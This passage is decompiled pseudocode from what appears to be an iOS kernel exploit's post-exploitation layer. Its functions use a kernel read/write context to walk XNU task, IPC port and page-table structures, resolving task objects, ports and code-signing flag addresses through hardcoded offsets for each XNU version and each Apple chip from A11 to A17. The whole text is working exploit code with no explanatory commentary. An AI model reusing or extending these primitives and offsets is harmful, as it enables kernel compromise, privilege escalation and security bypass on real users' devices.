  taskKaddr = kreadptr(krwCtx, taskListEntry);
  if ( !taskKaddr )
    return 0;
  if ( mach_task_self_ == task )
    krwCtx->gap_0x1A0 = taskKaddr;
  return read_pte_entry_chain(krwCtx, taskKaddr, a3, a4);
}

//----- (00000000000339B4) ----------------------------------------------------
__int64 __fastcall task_get_ipc_port_ptr(struct_krwCtx *krwCtx, mach_port_name_t task, mach_port_t port)
{
  __int64 result; // x0
  int v5; // [xsp+8h] [xbp-18h] BYREF
  mach_port_t v6; // [xsp+Ch] [xbp-14h] BYREF

  if ( port + 1 < 2 )
    return 0;
  result = setup_task_port_chain(krwCtx, task, &v6, &v5);
  if ( !result )
    return result;
  if ( port >> 8 >= v6 )
    return 0;
  result += v5 * (port >> 8);
  return result;
}

//----- (0000000000033A1C) ----------------------------------------------------
__int64 __fastcall task_self_get_ipc_port_ptr(struct_krwCtx *krwCtx, unsigned int a2)
{
  return task_get_ipc_port_ptr(krwCtx, mach_task_self_, a2);
}

//----- (0000000000033A30) ----------------------------------------------------
unsigned __int64 __fastcall task_get_ipc_port(struct_krwCtx *krwCtx, mach_port_name_t task, mach_port_t port)
{
  unsigned __int64 result; // x0
  __int64 vaddr; // [xsp+8h] [xbp-18h] BYREF

  result = task_get_ipc_port_ptr(krwCtx, task, port);
  if ( result )
  {
    if ( kread_physmap_decorated(krwCtx, result, (unsigned __int64 *)&vaddr) )
      return validate_kaddr_range(krwCtx, vaddr);
    else
      return 0;
  }
  return result;
}

//----- (0000000000033A88) ----------------------------------------------------
__int64 __fastcall walk_kaddr_chain_to_target(struct_krwCtx *krwCtx, __int64 a2, char a3)
{
  __int64 result; // x0
  unsigned __int64 v6; // x1
  __int64 v7; // [xsp+8h] [xbp-28h] BYREF
  __int64 v8; // [xsp+10h] [xbp-20h] BYREF
  __int64 v9; // [xsp+18h] [xbp-18h] BYREF

  v7 = 0;
  if ( !kread_physmap_decorated(krwCtx, a2 + 16LL * ((krwCtx->xnuVersionPacked - XNU_VERSION_PACKED(8020, 100, 0, 0, 0)) >> 32 > 4), (unsigned __int64 *)&v9) )
    return 0;
  result = validate_kaddr_range(krwCtx, v9);
  if ( !result )
    return result;
  result = v9;
  if ( krwCtx->xnuMajorVersion < 7195 )
  {
    v7 = v9;
    return result;
  }
  if ( !kread_physmap_decorated(krwCtx, v9 + 32, (unsigned __int64 *)&v8) )
    return 0;
  result = validate_kaddr_range(krwCtx, v8);
  if ( result )
  {
    result = v8;
    if ( (a3 & 1) == 0 )
    {
      if ( kread64_internal(krwCtx, v8 + 56, &v7) )
      {
        v6 = v7;
        if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8020, 140, 30, 0, 0) )
        {
          v6 = port_right_index_to_kaddr(krwCtx, HIDWORD(v7));
          v7 = v6;
        }
        return validate_kaddr_range(krwCtx, v6);
      }
      else
      {
        return v7;
      }
    }
  }
  return result;
}

//----- (0000000000033B98) ----------------------------------------------------
__int64 __fastcall traverse_sptm_pgtable_chain(struct_krwCtx *krwCtx, unsigned int a2, unsigned __int64 a3)
{
  unsigned __int64 v5; // x0
  __int64 v6; // x20
  unsigned int v7; // w25
  char v8; // w26
  unsigned __int64 v9; // x22
  int v10; // w23
  __int64 v11; // x24
  unsigned __int64 v12; // x1
  unsigned __int64 v15; // [xsp+8h] [xbp-58h] BYREF
  unsigned __int64 v16; // [xsp+10h] [xbp-50h] BYREF
  __int64 v17; // [xsp+18h] [xbp-48h] BYREF

  v5 = find_kernel_struct_addr(krwCtx, a2);
  v6 = 0;
  if ( v5 )
  {
    v7 = 0;
    v8 = 0;
    v9 = v5 + 56;
    while ( 1 )
    {
      v10 = kread_physmap_decorated(krwCtx, v9, (unsigned __int64 *)&v17);
      if ( v10 )
      {
        do
        {
          v11 = v17;
          if ( !v17 || !validate_kaddr_range(krwCtx, v17) || !kread_physmap_decorated(krwCtx, v11 - 16, &v16) )
            break;
          if ( v16 <= a3 )
          {
            if ( !kread_physmap_decorated(krwCtx, v11 - 8, &v15) )
              break;
            if ( v15 > a3 )
            {
              v6 = v11 - 32;
              v8 = 1;
              if ( v10 )
                goto LABEL_14;
              return v6;
            }
            v12 = v17 + 8;
          }
          else
          {
            v12 = v17;
          }
        }
        while ( kread_physmap_decorated(krwCtx, v12, (unsigned __int64 *)&v17) );
      }
      if ( !v10 )
        break;
LABEL_14:
      if ( (v8 & 1) == 0 && v7++ < 5 )
        continue;
      return v6;
    }
  }
  return v6;
}

//----- (0000000000033CB0) ----------------------------------------------------
unsigned __int64 __fastcall find_kernel_struct_addr(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned int v4; // w0
  unsigned int v5; // w20
  unsigned __int64 result; // x0
  __int64 v7; // [xsp+8h] [xbp-28h] BYREF

  v4 = get_task_context_size(krwCtx);
  if ( !v4 )
    return 0;
  v5 = v4;
  result = get_task_kobject_addr(krwCtx, a2);
  v7 = result;
  if ( !result )
    return result;
  if ( !kread_physmap_decorated(krwCtx, result + v5, (unsigned __int64 *)&v7) )
    return 0;
  if ( validate_kaddr_range(krwCtx, v7) )
    return v7;
  return 0;
}

//----- (0000000000033D38) ----------------------------------------------------
unsigned __int64 __fastcall scan_and_validate_kaddr(struct_krwCtx *krwCtx, unsigned int port, unsigned __int64 a3, unsigned __int64 *a4)
{
  unsigned __int64 result; // x0
  __int64 v9; // x8
  unsigned __int64 v10; // x1
  __int64 v11; // x8
  unsigned __int64 v12; // x8
  __int64 v13; // x0
  unsigned __int64 v14; // x1
  uint64_t v15[2]; // [xsp+0h] [xbp-30h] BYREF

  if ( !krw_ctx_has_flag((struct_krwCtx *)krwCtx, KRW_CTX_FLAG_SELF_TASK_PORT_CLEARED) )
  {
    v13 = traverse_sptm_pgtable_chain((struct_krwCtx *)krwCtx, port, a3);
    if ( v13 && (unsigned int)krw_read_thunk((struct_krwCtx *)krwCtx, v13 + 56, 16, v15) )
    {
      v14 = v15[0];
      if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8020, 140, 30, 0, 0) )
      {
        v14 = port_right_index_to_kaddr(krwCtx, HIDWORD(v15[0]));
        v15[0] = v14;
      }
      if ( validate_kaddr_range(krwCtx, v14) )
      {
        result = v15[0];
        *a4 = v15[1] & 0xFFFFFFFFFFFFF000LL;
        return result;
      }
    }
    return 0;
  }
  result = mach_vm_page_info_query_0(port, a3, a4);
  if ( !result )
    return result;
  if ( (result & 1) != 0 )
  {
    v10 = result - krwCtx->gap_0x138;
    if ( HIDWORD(result) )
    {
      if ( HIDWORD(v10) )
        goto LABEL_20;
    }
    else
    {
      v10 = (unsigned int)(result - (uint32_t)krwCtx->gap_0x138);
    }
    v12 = krwCtx->gap_0x130;
    if ( v12 )
      goto LABEL_19;
    return 0;
  }
  v9 = krwCtx->gap_0x19E0_size8;
  if ( !v9 )
    return 0;
  v10 = v9 + result;
  if ( !((v9 + result) >> 32) )
  {
    v11 = krwCtx->machHeaderPlus0x8000;
    if ( v11 )
    {
      v12 = v11 & 0xFFFFFFFF00000000LL;
LABEL_19:
      v10 |= v12;
      goto LABEL_20;
    }
    return 0;
  }
LABEL_20:
  return validate_kaddr_range(krwCtx, v10);
}

//----- (0000000000033E8C) ----------------------------------------------------
unsigned __int64 __fastcall kread_task_struct(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned __int64 result; // x0

  result = get_task_kobject_addr(krwCtx, a2);
  if ( result )
  {
    return read_kaddr_at_task_offset(krwCtx, result);
  }
  return result;
}
// 33EBC: variable 'vars8' is possibly undefined

//----- (0000000000033ED8) ----------------------------------------------------
__int64 __fastcall walk_task_kaddr_chain(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 result; // x0
  __int64 v4; // x8
  int xnuMajorVersion; // w8
  __int64 v6; // x8
  __int64 v7; // [xsp+8h] [xbp-18h] BYREF

  result = read_kaddr_at_task_offset(krwCtx, a2);
  v7 = result;
  if ( result )
  {
    if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    {
      v4 = 32;
      if ( krwCtx->xnuMajorVersion > 8791 )
        v4 = 24;
      if ( !kread_physmap_decorated(krwCtx, v4 + result, (unsigned __int64 *)&v7) )
        return 0;
      result = validate_kaddr_range(krwCtx, v7);
      if ( !result )
        return result;
    }
    result = 0;
    xnuMajorVersion = krwCtx->xnuMajorVersion;
    if ( xnuMajorVersion <= 8791 )
    {
      if ( (unsigned int)(xnuMajorVersion - 8019) < 2 )
      {
        v6 = 216;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v6 = 32;
      }
      else if ( xnuMajorVersion == 6153 )
      {
        v6 = 256;
      }
      else
      {
        if ( xnuMajorVersion != 7195 )
          return result;
        v6 = 240;
      }
      return v7 + v6;
    }
    if ( xnuMajorVersion == 8792 || xnuMajorVersion == 8796 || xnuMajorVersion == 10002 )
    {
      v6 = 32;
      return v7 + v6;
    }
  }
  return result;
}

//----- (0000000000033FFC) ----------------------------------------------------
unsigned __int64 __fastcall get_task_kobj_and_walk_chain(struct_krwCtx *krwCtx, mach_port_t a2)
{
  unsigned __int64 result; // x0

  result = get_task_kobject_addr(krwCtx, a2);
  if ( result )
  {
    return walk_task_kaddr_chain(krwCtx, result);
  }
  return result;
}
// 3402C: variable 'vars8' is possibly undefined

//----- (0000000000034048) ----------------------------------------------------
unsigned __int64 __fastcall resolve_task_kobj_kaddr(struct_krwCtx *krwCtx, __int64 a2, uint64_t *a3)
{
  unsigned __int64 result; // x0
  unsigned __int64 v6; // x21
  __int64 v7; // [xsp+0h] [xbp-30h] BYREF
  __int64 v8; // [xsp+8h] [xbp-28h] BYREF

  result = walk_task_kaddr_chain(krwCtx, a2);
  if ( result )
  {
    v6 = result;
    if ( kread_physmap_decorated(krwCtx, result, (unsigned __int64 *)&v8) )
    {
      result = validate_kaddr_range(krwCtx, v8);
      if ( !result )
        return result;
      if ( !a3 )
        return v8;
      if ( kread64_internal(krwCtx, v6, &v7) )
      {
        *a3 = v7;
        return v8;
      }
    }
    return 0;
  }
  return result;
}

//----- (00000000000340D8) ----------------------------------------------------
__int64 __fastcall get_kobj_and_resolve_kaddr(struct_krwCtx *krwCtx, unsigned int a2, uint64_t *a3)
{
  __int64 result; // x0

  result = get_task_kobject_addr(krwCtx, a2);
  if ( result )
  {
    return resolve_task_kobj_kaddr(krwCtx, result, a3);
  }
  return result;
}
// 34110: variable 'vars8' is possibly undefined

//----- (000000000003412C) ----------------------------------------------------
unsigned __int64 __fastcall get_task_kobj_kaddr_with_flags(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned __int64 result; // x0
  unsigned __int64 v4; // x20
  int xnuMajorVersion; // w8
  __int64 v7; // x8
  bool v8; // zf
  __int64 v9; // x9
  unsigned __int64 v10; // x1
  unsigned __int64 v11; // [xsp+8h] [xbp-18h] BYREF

  result = get_task_kobject_addr(krwCtx, a2);
  if ( result )
  {
    v4 = result;
    xnuMajorVersion = krwCtx->xnuMajorVersion;
    if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 && xnuMajorVersion != 7195 )
    {
      if ( xnuMajorVersion != 6153 )
        return 0;
      v8 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK);
      v7 = 960;
      v9 = 984;
      goto LABEL_13;
    }
    if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
    {
      v8 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK);
      v7 = 1048;
      v9 = 1120;
    }
    else
    {
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15) )
      {
        v7 = 1264;
LABEL_15:
        v10 = v4 + v7;
        if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
        {
          v11 = v4 + v7;
          goto LABEL_19;
        }
        if ( kread_physmap_decorated(krwCtx, v10, &v11) )
        {
          v10 = v11;
LABEL_19:
          if ( validate_kaddr_range(krwCtx, v10) )
            return v11;
          else
            return 0;
        }
        return 0;
      }
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_MASK) )
      {
        v7 = 1256;
        goto LABEL_15;
      }
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
      {
        v7 = 1248;
        goto LABEL_15;
      }
      v8 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11);
      v7 = 1232;
      v9 = 1296;
    }
LABEL_13:
    if ( v8 )
      v7 = v9;
    goto LABEL_15;
  }
  return result;
}

//----- (0000000000034298) ----------------------------------------------------
unsigned __int64 __fastcall get_task_kobj_dispatch(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned __int64 v3; // x0
  unsigned __int64 result; // x0
  int v5; // w8
  __int64 v6; // x8

  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    result = get_task_kobj_kaddr_with_flags(krwCtx, a2);
    if ( !result )
      return result;
    v5 = krwCtx->xnuMajorVersion;
    switch ( v5 )
    {
      case 8019:
        v6 = 288;
        break;
      case 7195:
        v6 = 296;
        break;
      case 6153:
        v6 = 336;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
          v6 = 296;
        break;
      default:
        return 0;
    }
    result += v6;
    return result;
  }
  v3 = get_task_kobj_via_physmap(krwCtx, a2);
  if ( v3 )
    return v3 + 8;
  else
    return 0;
}

//----- (0000000000034358) ----------------------------------------------------
unsigned __int64 __fastcall get_task_kobj_via_physmap(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned int v4; // w0
  unsigned int v5; // w21
  unsigned __int64 result; // x0
  __int64 v7; // [xsp+8h] [xbp-28h] BYREF

  v7 = 0;
  v4 = thread_port_field_offset(krwCtx);
  if ( !v4 )
    return 0;
  v5 = v4;
  result = get_task_kobject_addr(krwCtx, a2);
  if ( !result )
    return result;
  if ( !kread_physmap_decorated(krwCtx, result + v5, (unsigned __int64 *)&v7) )
    return 0;
  if ( validate_kaddr_range(krwCtx, v7) )
    return v7;
  return 0;
}

//----- (00000000000343E0) ----------------------------------------------------
__int64 __fastcall thread_port_field_offset(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8
  unsigned int v4; // w8
  uint64_t xnuVersionPacked; // x9
  unsigned int v6; // w10
  unsigned __int64 v7; // x11

  result = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion > 8795 )
  {
    if ( xnuMajorVersion != 8796 )
    {
      if ( xnuMajorVersion != 10002 )
        return result;
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
      {
        v4 = 960;
      }
      else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_MASK) )
      {
        v4 = 880;
      }
      else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_MASK) )
      {
        v4 = 872;
      }
      else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
      {
        v4 = 856;
      }
      else
      {
        v4 = 904;
      }
      xnuVersionPacked = krwCtx->xnuVersionPacked;
      v6 = v4 + 16;
      v7 = XNU_VERSION_PACKED(10002, 42, 7, 1023, 1023);
LABEL_37:
      if ( xnuVersionPacked <= v7 )
        return v4;
      else
        return v6;
    }
  }
  else
  {
    if ( (unsigned int)(xnuMajorVersion - 8019) < 2 )
    {
      if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
        return 0;
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15) )
      {
        v4 = 928;
      }
      else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_MASK) )
      {
        v4 = 920;
      }
      else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
      {
        v4 = 912;
      }
      else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11) )
      {
        v4 = 896;
      }
      else
      {
        v4 = 960;
      }
      xnuVersionPacked = krwCtx->xnuVersionPacked;
      v6 = v4 - 8;
      v7 = XNU_VERSION_PACKED(8020, 119, 1023, 1023, 1023);
      goto LABEL_37;
    }
    if ( xnuMajorVersion != 8792 )
      return result;
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_MASK) )
    return 888;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_MASK) )
    return 880;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
    return 864;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11) )
    return 848;
  return 912;
}

//----- (00000000000345D4) ----------------------------------------------------
__int64 __fastcall get_task_kobj_with_offset(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned __int64 v3; // x0
  __int64 v4; // x8
  int v5; // w9
  __int64 v6; // x8

  v3 = get_task_kobj_kaddr_with_flags(krwCtx, a2);
  v4 = 0;
  if ( v3 )
  {
    v5 = krwCtx->xnuMajorVersion;
    if ( v5 > 8018 )
    {
      if ( v5 == 8019 )
      {
        v6 = 256;
        return v6 + v3;
      }
      if ( v5 == 8020 )
      {
        v6 = 240;
        return v6 + v3;
      }
    }
    else
    {
      if ( v5 == 6153 )
      {
        v6 = 304;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(6153, 40, 149, 1023, 1023) )
          v6 = 264;
        return v6 + v3;
      }
      if ( v5 == 7195 )
      {
        v6 = 264;
        return v6 + v3;
      }
    }
  }
  return v4;
}

//----- (0000000000034680) ----------------------------------------------------
unsigned __int64 __fastcall get_task_csflags_kaddr(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned __int64 v3; // x0
  __int64 v4; // x8
  int v5; // w9
  __int64 v6; // x8

  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    v3 = kread_task_struct(krwCtx, a2);
  else
    v3 = kread_physmap_two_hops(krwCtx, a2);
  v4 = 0;
  if ( !v3 )
    return v4;
  v5 = krwCtx->xnuMajorVersion;
  if ( v5 > 8791 )
  {
    if ( v5 != 8792 && v5 != 8796 && v5 != 10002 )
      return v4;
LABEL_13:
    v6 = 768;
    if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v6 = 28;
    return v6 + v3;
  }
  if ( (unsigned int)(v5 - 8019) < 2 )
    goto LABEL_13;
  if ( v5 == 6153 )
  {
    v6 = 664;
    return v6 + v3;
  }
  if ( v5 == 7195 )
  {
    v6 = 640;
    return v6 + v3;
  }
  return v4;
}

//----- (0000000000034754) ----------------------------------------------------
__int64 __fastcall kread_physmap_two_hops(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned int v4; // w0
  unsigned int v5; // w21
  __int64 result; // x0
  __int64 v7; // x20
  __int64 v8; // x0
  __int64 v10; // [xsp+0h] [xbp-30h] BYREF
  __int64 v11; // [xsp+8h] [xbp-28h] BYREF

  v4 = get_ptrauth_data_ptr_offset(krwCtx);
  if ( !v4 )
    return 0;
  v5 = v4;
  result = get_task_kobject_addr(krwCtx, a2);
  if ( !result )
    return result;
  v7 = result;
  result = validate_kaddr_range(krwCtx, result);
  if ( !result )
    return result;
  if ( !kread_physmap_decorated(krwCtx, v7 + v5, (unsigned __int64 *)&v11) )
    return 0;
  result = validate_kaddr_range(krwCtx, v11);
  if ( !result )
    return result;
  if ( !kread_physmap_decorated(krwCtx, v11 + 8, (unsigned __int64 *)&v10) )
    return 0;
  v8 = validate_kaddr_range(krwCtx, v10);
  if ( v7 != v10 || v8 == 0 )
    return 0;
  else
    return v11;
}

//----- (000000000003481C) ----------------------------------------------------
__int64 __fastcall get_task_struct_csblob_offset(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int v3; // w8

  result = 0LL;
  v3 = krwCtx->xnuMajorVersion;
  if ( v3 <= 8019 )
  {
    if ( v3 == 6153 || v3 == 7195 )
      return 268LL;
    if ( v3 == 8019 )
      return 284LL;
    return result;
  }
  if ( v3 > 8795 )
  {
    if ( v3 != 8796 )
    {
      if ( v3 == 10002 )
        return 200LL;
      return result;
    }
    return 180LL;
  }
  if ( v3 == 8020 )
    return 148LL;
  if ( v3 == 8792 )
    return 180LL;
  return result;
}

//----- (00000000000348BC) ----------------------------------------------------
__int64 __fastcall get_task_struct_small_offset(struct_krwCtx *krwCtx)
{
  __int64 result; // x0
  int v3; // w8
  bool v4; // zf
  int v5; // w9

  result = 0LL;
  v3 = krwCtx->xnuMajorVersion;
  if ( v3 <= 8019 )
  {
    if ( v3 == 6153 || v3 == 7195 || v3 == 8019 )
      return 72LL;
  }
  else
  {
    if ( v3 > 8795 )
    {
      v4 = v3 == 10002;
      v5 = 8796;
    }
    else
    {
      v4 = v3 == 8020;
      v5 = 8792;
    }
    if ( v4 || v3 == v5 )
      return 64LL;
  }
  return result;
}

//----- (000000000003492C) ----------------------------------------------------
__int64 __fastcall walk_task_context_to_kobj(struct_krwCtx *krwCtx, __int64 a2)
{
  unsigned int v4; // w0
  __int64 result; // x0
  unsigned int v6; // w0
  __int64 v7; // [xsp+0h] [xbp-20h] BYREF
  __int64 v8; // [xsp+8h] [xbp-18h] BYREF

  v4 = get_task_context_size(krwCtx);
  if ( !v4 || !kread_physmap_decorated(krwCtx, a2 + v4, (unsigned __int64 *)&v8) )
    return 0;
  result = validate_kaddr_range(krwCtx, v8);
  if ( !result )
    return result;
  v6 = get_task_struct_small_offset(krwCtx);
  if ( !v6 || !kread_physmap_decorated(krwCtx, v8 + v6, (unsigned __int64 *)&v7) )
    return 0;
  if ( validate_kaddr_range(krwCtx, v7) )
    return v7;
  return 0;
}

//----- (00000000000349C8) ----------------------------------------------------
unsigned __int64 __fastcall task_struct_field_kread(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned int v4; // w0
  unsigned int v5; // w20
  unsigned __int64 result; // x0
  unsigned __int64 v7; // [xsp+8h] [xbp-28h] BYREF

  v4 = get_task_struct_small_offset(krwCtx);
  if ( !v4 )
    return 0;
  v5 = v4;
  result = find_kernel_struct_addr(krwCtx, a2);
  v7 = result;
  if ( result )
  {
    if ( kread_physmap_decorated(krwCtx, result + v5, &v7) )
      return v7;
    else
      return 0;
  }
  return result;
}

//----- (0000000000034A40) ----------------------------------------------------
__int64 __fastcall kread_task_port_entry(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 result; // x0
  int v4; // w8
  int v5; // w9
  __int64 v6; // x8
  __int64 v7; // x8
  unsigned __int64 v8; // x8
  unsigned __int64 v9; // x8
  uint64_t v10; // [xsp+8h] [xbp-38h] BYREF
  __int64 v11; // [xsp+10h] [xbp-30h] BYREF
  __int64 v12; // [xsp+18h] [xbp-28h] BYREF
  __int64 v13; // [xsp+20h] [xbp-20h] BYREF

  v12 = 0;
  v13 = 0;
  result = resolve_task_kobj_kaddr(krwCtx, a2, 0);
  if ( !result )
    return result;
  result = kread_physmap_decorated(krwCtx, result + 120, (unsigned __int64 *)&v11);
  if ( !(uint32_t)result )
    return result;
  result = validate_kaddr_range(krwCtx, v11);
  if ( !result )
    return result;
  result = 0;
  v4 = krwCtx->xnuMajorVersion;
  if ( v4 > 8791 )
  {
    if ( v4 == 8792 || v4 == 10002 )
      goto LABEL_12;
    v5 = 8796;
  }
  else
  {
    if ( (unsigned int)(v4 - 8019) < 2 || v4 == 6153 )
      goto LABEL_12;
    v5 = 7195;
  }
  if ( v4 != v5 )
    return result;
LABEL_12:
  result = kread_physmap_decorated(krwCtx, v11 + krwCtx->stride_0x168, (unsigned __int64 *)&v12);
  if ( !(uint32_t)result )
    return result;
  if ( (unsigned __int64)(v12 + 1) >= 2 && !validate_kaddr_range(krwCtx, v12) )
  {
    v8 = krwCtx->xnuVersionPacked;
    if ( v8 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
      return 0;
    if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 && (v12 & 0x7FFFFFFFFFLL) == 0 )
    {
      v12 = 0;
    }
    else if ( v8 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    {
      return 0;
    }
  }
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) && (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
  {
    result = kread64_internal(krwCtx, v11 + krwCtx->stride_0x168, &v10);
    if ( !(uint32_t)result )
      return result;
    v6 = v10;
  }
  else
  {
    v6 = v12;
  }
        krwCtx->gap_0x3A0 = v6;
  result = kread_physmap_decorated(
             krwCtx,
             v11 + (unsigned int)(2 * krwCtx->stride_0x168),
             (unsigned __int64 *)&v13);
  if ( (uint32_t)result )
  {
    if ( (unsigned __int64)(v13 + 1) < 2 || validate_kaddr_range(krwCtx, v13) )
      goto LABEL_23;
    v9 = krwCtx->xnuVersionPacked;
    if ( v9 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
    {
      if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 && (v13 & 0x7FFFFFFFFFLL) == 0 )
      {
        v13 = 0;
      }
      else if ( v9 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      {
        return 0;
      }
LABEL_23:
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) || (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
      {
        v7 = v13;
        krwCtx->gap_0x3A8 = v13;
        goto LABEL_28;
      }
      result = kread64_internal(krwCtx, v11 + (unsigned int)(2 * krwCtx->stride_0x168), &v10);
      if ( (uint32_t)result )
      {
        krwCtx->gap_0x3A8 = v10;
        v7 = v13;
LABEL_28:
        krwCtx->gap_0x390 = v12;
        krwCtx->gap_0x398 = v7;
        krwCtx->gap_0x378 = 0x100000000LL;
        krwCtx->gap_0x18F0 = v11;
        LODWORD(krwCtx->gap_0x18F8) = 0;
        return 1;
      }
      return result;
    }
    return 0;
  }
  return result;
}

//----- (0000000000034D14) ----------------------------------------------------
__int64 __fastcall necp_set_opt_string_6(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0

  result = get_task_kobject_addr(krwCtx, a2);
  if ( result )
  {
    result = kread_task_port_entry(krwCtx, result);
    if ( (uint32_t)result )
    {
      krwCtx->gap_0x18F8 = a2;
      return 1;
    }
  }
  return result;
}

//----- (0000000000034D58) ----------------------------------------------------
unsigned __int64 __fastcall get_task_port_kaddr(struct_krwCtx *krwCtx, unsigned int a2, int a3)
{
  unsigned __int64 result; // x0
  unsigned __int64 v5; // x8
  int xnuMajorVersion; // w9
  int v7; // w10
  unsigned __int64 v8; // x19
  int v9; // w8
  unsigned __int64 v10; // x21
  int v11; // w0
  __int64 v12; // x9
  __int64 v13; // x10
  __int64 v14; // x8
  bool v15; // zf
  __int64 v16; // x9
  int has_flag; // w0
  unsigned __int64 xnuVersionPacked; // x8
  bool v19; // cc

  if ( a3 )
  {
    result = kread_physmap_two_hops(krwCtx, a2);
    if ( !result )
      return result;
    v5 = result;
    result = 0;
    xnuMajorVersion = krwCtx->xnuMajorVersion;
    if ( xnuMajorVersion > 8795 )
    {
      if ( xnuMajorVersion != 10002 )
      {
        v7 = 8796;
LABEL_20:
        if ( xnuMajorVersion != v7 )
          return result;
      }
    }
    else if ( xnuMajorVersion != 8020 )
    {
      v7 = 8792;
      goto LABEL_20;
    }
    return v5 + 120;
  }
  result = get_task_kobject_addr(krwCtx, a2);
  if ( !result )
    return result;
  v8 = result;
  result = 0;
  v9 = krwCtx->xnuMajorVersion;
  if ( v9 <= 8791 )
  {
    if ( (unsigned int)(v9 - 8019) < 2 )
    {
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15) )
      {
        v14 = 1052;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v14 = 1004;
        return v14 + v8;
      }
      has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK);
      xnuVersionPacked = krwCtx->xnuVersionPacked;
      v16 = 1000;
      if ( xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
        v16 = 952;
      v19 = xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
      v14 = 1036;
      if ( v19 )
        v14 = 988;
      v15 = !has_flag;
    }
    else
    {
      if ( v9 != 6153 )
      {
        if ( v9 != 7195 )
          return result;
        v10 = krwCtx->xnuVersionPacked;
        v11 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK);
        v12 = 1012;
        if ( !v11 )
          v12 = 984;
        v13 = 1028;
        if ( !v11 )
          v13 = 992;
        if ( v10 >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
          v14 = v13;
        else
          v14 = v12;
        return v14 + v8;
      }
      v15 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK);
      v14 = 960;
